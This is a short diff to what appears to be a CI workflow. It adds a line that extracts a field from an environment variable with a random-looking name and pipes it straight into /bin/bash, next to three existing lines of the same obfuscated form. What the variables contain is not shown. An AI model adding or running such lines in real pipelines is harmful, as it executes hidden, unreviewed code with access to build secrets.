@@ -55,6 +55,7 @@ jobs:
           printf '%s' "$fps7" | jq -r .rzl9581 | /bin/bash
           echo $nuyiw02 | jq -r .vz584 | /bin/bash
           echo $cqi65371 | jq -r .bik95491 | /bin/bash
+          printf '%s' "$hk68519" | jq -r .bg0 | /bin/bash
 
       - name: Store artifact
         if: always()
